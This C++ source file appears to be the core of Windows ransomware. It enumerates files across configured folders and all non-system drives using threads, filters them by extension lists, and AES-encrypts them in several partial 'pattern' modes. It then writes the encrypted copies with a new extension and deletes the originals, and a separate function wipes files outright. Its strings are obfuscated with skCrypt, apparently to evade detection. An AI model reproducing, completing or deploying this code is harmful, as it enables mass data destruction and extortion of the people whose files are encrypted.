#include "headers.h"

using namespace std;
namespace fs = std::experimental::filesystem;

vector<string> globalAllFiles;
mutex allFilesMutex;

bool isFileToEncrypt(const string& file) {
    for (string safeFile : safeFiles)
        if (safeFile == file)
            return false;

    vector<string> fileSplitted = Split(file, '.');

#if ENABLE_WHITELIST
    for (string extensionW : whitelist)
        if (fileSplitted.back() == extensionW)
            return true;
#endif

#if ENABLE_BLACKLIST
    for (string extensionB : blacklist)
        if (fileSplitted.back() == extensionB)
            return false;
#endif

    return true;
}

void GetAllFiles(const string& folderPath) {
    vector<string> tmpFiles;

    for (const auto& entry : fs::recursive_directory_iterator(folderPath))
        if (fs::is_regular_file(entry) && isFileToEncrypt(entry.path().string()))
            tmpFiles.push_back(entry.path().string());

    allFilesMutex.lock();
    globalAllFiles.insert(globalAllFiles.end(), tmpFiles.begin(), tmpFiles.end());
    allFilesMutex.unlock();
}

vector<string> RetrieveFolders(int argc, char* argv[]) {
    vector<string> folders;

#if DEBUG
    if (argc > 1)
        folders.push_back(argv[1]);
    else if (FileExists(DEBUG_FOLDER))
        folders.push_back(DEBUG_FOLDER);
    else
        folders.push_back((string)skCrypt(".\\"));
#else
    for (string folder : foldersToEncrypt)
        if (FileExists(folder))
            folders.push_back(folder);
#endif

#if ALL_DRIVES
    char buffer[256];
    DWORD len = GetLogicalDriveStringsA(sizeof(buffer) / sizeof(buffer[0]), buffer);

    if (len > 0 && len <= sizeof(buffer) / sizeof(buffer[0])) {
        char* drive = buffer;

        while (*drive) {
            ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;
            if (GetDiskFreeSpaceExA(drive, &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes))
                if ((string)drive != (string)skCrypt("C:\\"))
                    folders.push_back((string)drive);

            drive += strlen(drive) + 1;
        }
    }
#endif

    return folders;
}

vector<string> GetFiles(const vector<string>& mainDirs) {
    vector<string> result;
    vector<thread> threads;

    for (string dir : mainDirs) {
        for (const auto& entry : fs::directory_iterator(dir)) {
            if (fs::is_regular_file(entry) && isFileToEncrypt(entry.path().string()))
                result.push_back(entry.path().string());

            else if (fs::is_directory(entry))
                threads.push_back(thread(GetAllFiles, entry.path().string()));
        }
    }

    for (int i = 0; i < threads.size(); i++)
        threads[i].join();

    result.insert(result.end(), globalAllFiles.begin(), globalAllFiles.end());
    return result;
}

void EncryptFiles(const vector<string>& files, const string& key, const string& iv) {
    for (string file : files) {

        HANDLE hFile = CreateFileA(file.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (GetLastError() == ERROR_FILE_NOT_FOUND || (MAX_FILE_SIZE == 0 ? false : GetFileSize(hFile, NULL) > MAX_FILE_SIZE)) {
            CloseHandle(hFile);
            continue;
        }
        CloseHandle(hFile);
        ifstream fin(file, ios::in | ios::binary);
        vector<BYTE> data(istreambuf_iterator<char>(fin), {});
        fin.close();

        string content = (string)skCrypt("");

        if (ENCRYPTION_MODE == (string)skCrypt("HeadOnly") && data.size() > HEAD_BYTES) {
            content += aes_encrypt(key, base64_encode(&data[0], HEAD_BYTES), iv);
            content += (string)skCrypt("\n");
            content += base64_encode(&data[HEAD_BYTES], data.size() - HEAD_BYTES);
        }
        else if (ENCRYPTION_MODE == (string)skCrypt("DotPattern")) {
            size_t index = 0;
            for (size_t c = 0; index < data.size(); c++) {
                if (c % 2 == 0) {
                    content += aes_encrypt(key, base64_encode(&data[index], min(STEP_BYTES, data.size() - index)), iv);
                    index += HEAD_BYTES;
                }
                else {
                    content += base64_encode(&data[index], min(STEP_BYTES, data.size() - index));
                    index += STEP_BYTES;
                }
                content += (string)skCrypt("\n");
            }
        }
        else if (ENCRYPTION_MODE == (string)skCrypt("SmartPattern")) {
            content += aes_encrypt(key, base64_encode(&data[0], min(HEAD_BYTES, data.size())), iv);
            content += (string)skCrypt("\n");

            if (data.size() > HEAD_BYTES) {
                for (vector<BYTE> chunk : VectorSplitter(vector<BYTE>(data.begin() + HEAD_BYTES, data.end()), 10)) {
                    size_t splitIndex = chunk.size() * PERCENT_BLOCK / 100;

                    content += aes_encrypt(key, base64_encode(&chunk[0], min(splitIndex, chunk.size())), iv);
                    content += (string)skCrypt("\n");
                    if (splitIndex < chunk.size())
                        content += base64_encode(&chunk[splitIndex], chunk.size() - splitIndex);
                    content += (string)skCrypt("\n");
                }
            }
        }
        else if (ENCRYPTION_MODE == (string)skCrypt("AdvancedSmartPattern")) {
            content += aes_encrypt(key, base64_encode(&data[0], min(HEAD_BYTES, data.size())), iv);
            content += (string)skCrypt("\n");

            if (data.size() > HEAD_BYTES) {
                for (vector<BYTE> chunk : VectorSplitter(vector<BYTE>(data.begin() + HEAD_BYTES, data.end()), NUM_BLOCKS)) {
                    size_t splitIndex = chunk.size() * PERCENT_BLOCK / 100;

                    content += aes_encrypt(key, base64_encode(&chunk[0], min(splitIndex, chunk.size())), iv);
                    content += (string)skCrypt("\n");
                    if (splitIndex < chunk.size())
                        content += base64_encode(&chunk[splitIndex], chunk.size() - splitIndex);
                    content += (string)skCrypt("\n");
                }
            }
        }
        else
            content = aes_encrypt(key, base64_encode(&data[0], data.size()), iv);

#if OVERWRITING
        if (!rename(file.c_str(), (file + FILE_EXTENSION).c_str()))
            MoveFile((LPCWSTR)file.c_str(), (LPCWSTR)(file + FILE_EXTENSION).c_str());

#else
        if (!remove(file.c_str()))
            DeleteFileA(file.c_str());
#endif

        ofstream fout(file + FILE_EXTENSION, ios::out);
        fout.write((const char*)&content[0], content.size());
        fout.close();
    }
}

void WipeFiles(const std::vector<std::string>& files) {
    for (string file : files)
        if (!remove(file.c_str()))
            DeleteFileA(file.c_str());
    return;
}
